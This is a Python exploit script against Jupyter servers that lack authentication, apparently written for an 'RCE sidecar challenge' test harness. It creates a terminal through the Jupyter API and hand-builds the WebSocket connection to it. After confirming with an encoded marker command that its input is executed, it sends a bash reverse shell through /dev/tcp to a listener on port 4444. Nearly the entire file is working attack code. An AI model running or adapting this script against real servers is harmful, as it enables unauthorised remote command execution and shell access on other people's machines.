"""Use an unauthenticated Jupyter terminal to launch a challenged shell."""

import base64
import hashlib
import json
import os
import secrets
import socket
import struct
import time
import urllib.request
from urllib.parse import urlsplit


def read_exact(connection: socket.socket, length: int) -> bytes:
    """Read a complete WebSocket field."""
    chunks = []
    remaining = length
    while remaining:
        chunk = connection.recv(remaining)
        if not chunk:
            raise RuntimeError("Terminal WebSocket closed early")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def open_terminal_socket(base_url: str, name: str) -> socket.socket:
    """Upgrade an anonymous HTTP connection to Jupyter's terminal socket."""
    parsed = urlsplit(base_url)
    host = parsed.hostname or "localhost"
    port = parsed.port or 80
    key = base64.b64encode(secrets.token_bytes(16)).decode("ascii")
    connection = socket.create_connection((host, port), timeout=12)
    connection.settimeout(12)
    request = (
        f"GET /terminals/websocket/{name} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        f"Origin: http://{host}:{port}\r\n\r\n"
    )
    connection.sendall(request.encode("ascii"))
    headers = bytearray()
    while not headers.endswith(b"\r\n\r\n"):
        headers.extend(read_exact(connection, 1))
        if len(headers) > 8192:
            raise RuntimeError("WebSocket response headers exceeded limit")
    lines = headers.decode("latin-1").split("\r\n")
    if " 101 " not in lines[0]:
        raise RuntimeError(f"Terminal socket was rejected: {lines[0]}")
    response_headers = dict(
        line.split(": ", 1) for line in lines[1:] if ": " in line
    )
    expected = base64.b64encode(hashlib.sha1(
        (key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode("ascii")
    ).digest()).decode("ascii")
    if response_headers.get("Sec-Websocket-Accept",
                            response_headers.get("Sec-WebSocket-Accept")) != expected:
        raise RuntimeError("Terminal WebSocket handshake was not authenticated")
    return connection


def send_text(connection: socket.socket, text: str) -> None:
    """Send a masked client text frame."""
    payload = text.encode("utf-8")
    mask = secrets.token_bytes(4)
    if len(payload) < 126:
        header = bytes((0x81, 0x80 | len(payload)))
    else:
        header = bytes((0x81, 0x80 | 126)) + struct.pack("!H", len(payload))
    masked = bytes(byte ^ mask[index % 4] for index, byte in enumerate(payload))
    connection.sendall(header + mask + masked)


def receive_text(connection: socket.socket) -> str:
    """Read one server text frame from the terminal."""
    first, second = read_exact(connection, 2)
    length = second & 0x7F
    if length == 126:
        length = struct.unpack("!H", read_exact(connection, 2))[0]
    elif length == 127:
        length = struct.unpack("!Q", read_exact(connection, 8))[0]
    if second & 0x80:
        mask = read_exact(connection, 4)
    else:
        mask = None
    payload = read_exact(connection, length)
    if mask:
        payload = bytes(byte ^ mask[index % 4] for index, byte in enumerate(payload))
    if first & 0x0F == 0x8:
        raise RuntimeError("Terminal WebSocket closed")
    if first & 0x0F != 0x1:
        return ""
    message = json.loads(payload.decode("utf-8"))
    return str(message[1]) if message[0] == "stdout" else ""


def create_terminal(base_url: str) -> str:
    """Create an unauthenticated terminal through the Jupyter API."""
    request = urllib.request.Request(
        base_url + "/api/terminals", data=b"", method="POST"
    )
    with urllib.request.urlopen(request, timeout=12) as response:
        terminal = json.load(response)
    return str(terminal["name"])


def wait_for_output(connection: socket.socket, marker: str) -> None:
    """Require output generated by a command rather than its echoed input."""
    deadline = time.monotonic() + 12
    output = ""
    while time.monotonic() < deadline:
        output += receive_text(connection)
        if marker in output:
            return
    raise RuntimeError("The terminal did not execute the proof command")


def main() -> None:
    """Create a terminal and make its shell answer the RCE sidecar challenge."""
    base_url = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    name = create_terminal(base_url)
    with open_terminal_socket(base_url, name) as connection:
        marker = "JUPYTER_EXEC_" + secrets.token_hex(8)
        encoded = "".join(f"\\x{byte:02x}" for byte in marker.encode("ascii"))
        send_text(connection, json.dumps(["stdin", f"printf '%b\\n' '{encoded}'\r"]))
        wait_for_output(connection, marker)
        shell = "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'\r"
        send_text(connection, json.dumps(["stdin", shell]))
        time.sleep(5)
    print(json.dumps({"evidence_payload": {}, "terminal": name}))


if __name__ == "__main__":
    main()
